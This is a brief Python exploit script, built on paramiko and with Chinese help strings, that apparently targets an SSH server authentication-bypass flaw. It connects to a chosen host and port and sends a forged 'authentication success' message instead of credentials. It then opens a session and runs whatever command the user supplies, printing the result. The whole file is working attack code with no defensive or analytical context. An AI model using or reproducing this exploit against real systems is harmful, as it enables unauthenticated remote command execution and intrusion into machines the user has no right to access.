import socket
import argparse
import paramiko

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="目标主机 (e.g. 127.0.0.1)", required=True)
    parser.add_argument("-p", "--port", help="目标端口 (default: 22)", default="22")
    parser.add_argument("-c", "--command", help="执行命令 (e.g. whoami)", required=True)
    args = parser.parse_args()

    sock = socket.socket()
    sock.connect((args.target, int(args.port)))

    message = paramiko.message.Message()
    transport = paramiko.transport.Transport(sock)
    transport.start_client()

    message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
    transport._send_message(message)

    client = transport.open_session(timeout=10)
    client.exec_command(args.command)

    stdout = client.makefile("rb", 2048)
    stderr = client.makefile_stderr("rb", 2048)

    output = stdout.read()
    error = stderr.read()

    stdout.close()
    stderr.close()

    print((output + error).decode())